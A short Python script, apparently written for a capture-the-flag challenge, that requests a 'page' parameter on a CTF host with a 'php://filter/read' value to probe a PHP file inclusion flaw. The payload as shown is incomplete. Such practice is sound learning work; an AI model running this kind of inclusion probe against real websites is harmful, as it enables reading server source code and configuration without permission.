import requests

url = 'https://wallofshame.unitedctf.ca/?page='
payload = 'php://filter/read'

resp = requests.get(url+payload)
print(resp.text)